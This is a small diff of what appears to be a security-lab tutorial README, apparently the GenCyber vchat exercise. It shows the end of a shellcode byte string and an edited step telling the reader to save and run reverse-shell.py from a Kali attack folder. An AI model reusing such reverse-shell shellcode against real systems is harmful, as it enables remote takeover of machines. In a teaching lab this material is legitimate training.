@@ -327,7 +327,7 @@ SHELL += b"\x27\xd1\x8d\x88\x22\x9d\x09\x61\x5f\x8e\xff\x85"
 SHELL += b"\xcc\xaf\xd5"
 ```
 
-3. Run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within a terminal
+3. Save reverse-shell.py and run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within a terminal
 ```
 python reverse-shell.py
 ```  
